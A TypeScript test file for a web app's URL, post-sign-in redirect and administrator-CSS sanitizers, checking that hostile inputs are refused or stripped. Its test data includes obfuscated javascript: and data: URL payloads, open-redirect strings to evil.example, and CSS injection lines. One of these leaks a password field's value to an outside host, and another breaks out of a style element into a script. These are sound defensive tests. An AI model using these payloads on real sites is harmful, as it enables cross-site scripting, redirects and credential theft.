import { sanitizeCustomCss } from "./customCss";
import { forgetReturnTo, internalPath, rememberReturnTo, safeHref, takeReturnTo } from "./safeUrl";

describe("safeHref", () => {
  it("keeps web addresses and same-origin paths", () => {
    expect(safeHref("https://radarr.example.com/movie/1")).toBe("https://radarr.example.com/movie/1");
    expect(safeHref("/api/v1/items/x/download")).toBe("/api/v1/items/x/download");
  });

  it("refuses script and data links in every spelling", () => {
    for (const bad of ["javascript:alert(1)", " JavaScript:alert(1)", "java\tscript:alert(1)", "data:text/html,<script>", "vbscript:x", ""]) {
      expect(safeHref(bad)).toBeUndefined();
    }
    expect(safeHref(null)).toBeUndefined();
  });

  it("accepts other schemes only when asked", () => {
    expect(safeHref("otpauth://totp/Streamero:ana?secret=ABC")).toBeUndefined();
    expect(safeHref("otpauth://totp/Streamero:ana?secret=ABC", ["otpauth:"])).toMatch(/^otpauth:/);
  });
});

describe("internalPath (return after sign-in)", () => {
  it("accepts paths of this app", () => {
    expect(internalPath("/item/abc?x=1#t")).toBe("/item/abc?x=1#t");
  });

  it("refuses anything that leaves the site or loops back to sign-in", () => {
    for (const bad of ["//evil.example", "/\\evil.example", "https://evil.example/", "/\t/evil.example", "javascript:alert(1)", "/login", "/setup", "/invite/x", "relative"]) {
      expect(internalPath(bad)).toBeUndefined();
    }
  });

  it("remembers once, and not after a deliberate sign-out", () => {
    rememberReturnTo("/library/1");
    expect(takeReturnTo()).toBe("/library/1");
    expect(takeReturnTo()).toBeUndefined();
    forgetReturnTo();
    rememberReturnTo("/library/2");
    expect(takeReturnTo()).toBeUndefined();
    rememberReturnTo("/library/3");
    expect(takeReturnTo()).toBe("/library/3");
  });
});

describe("administrator CSS", () => {
  it("keeps ordinary theme rules", () => {
    const css = ":root { --amb-a: #d6763f; } .x { background: url(/api/v1/branding/bg.jpg) }";
    expect(sanitizeCustomCss(css)).toBe(css);
    expect(sanitizeCustomCss("a{background:url(data:image/png;base64,AAAA)}")).toContain("data:image/png");
  });

  it("removes every way to reach another host", () => {
    const attack = [
      "@import url(https://evil.example/x.css);",
      "@import 'https://evil.example/y.css';",
      'input[name=password][value^="a"] { background: url("https://evil.example/?a") }',
      "b { background: u\\72l(https://evil.example/escaped) }",
      "c { background: u/**/rl(https://evil.example/comment) }",
      "d { background-image: image-set('https://evil.example/set' 1x) }",
      "@font-face { font-family: x; src: url(//evil.example/font.woff) }",
      "e { background: url(javascript:alert(1)) }",
    ].join("\n");
    const out = sanitizeCustomCss(attack);
    expect(out).not.toMatch(/evil\.example/);
    expect(out).not.toMatch(/@import/i);
    expect(out).not.toMatch(/javascript:/i);
  });

  it("cannot close its own style element", () => {
    expect(sanitizeCustomCss("a{color:red}</style><script>alert(1)</script>")).not.toMatch(/<\/style/i);
  });
});
